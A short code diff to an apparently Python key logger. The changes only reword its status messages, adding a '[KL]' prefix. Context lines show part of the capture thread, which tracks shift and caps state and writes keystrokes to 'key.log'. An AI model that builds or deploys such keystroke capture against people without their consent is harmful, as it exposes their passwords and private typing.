@@ -81,7 +81,7 @@ def start_logger(log_file="key.log"):
     def logging_thread():
         dev = logger_device  # capture reference
         try:
-            print(f"✅ Key Logger started on {dev.path} - {dev.name}")
+            print(f"[KL] Key Logger started on {dev.path} - {dev.name}")
 
             shift = False
             caps = False
@@ -132,11 +132,11 @@ def start_logger(log_file="key.log"):
                         f.write(f"[{key}]")
 
         except Exception as e:
-            print(f"Logger error: {e}")
+            print(f"[KL] Key logger error: {e}")
         finally:
             with open(log_file, "a", encoding="utf-8") as f:
                 f.write("-" * 60 + "\n\n")
-            print("Logger stopped.")
+            print("[KL] Key logger stopped.")
 
     logger_thread = threading.Thread(target=logging_thread, daemon=True)
     logger_thread.start()
